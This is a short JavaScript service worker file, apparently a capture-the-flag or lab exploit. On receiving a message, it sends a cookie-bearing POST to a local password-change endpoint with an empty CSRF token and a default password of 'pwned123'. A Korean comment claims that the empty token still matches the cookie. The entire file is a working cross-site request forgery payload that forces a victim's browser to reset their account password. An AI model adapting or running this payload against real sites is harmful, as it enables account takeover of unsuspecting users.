// sw.js
self.addEventListener('message', async (e) => {
  const pw = e.data.pw || 'pwned123';
  // CSRF 토큰은 굳이 비울 필요 없이 빈값으로 보내도 쿠키와 매치됩니다.
  await fetch('http://localhost:3000/change_password', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf_token=&new_password=' + encodeURIComponent(pw),
  });
});
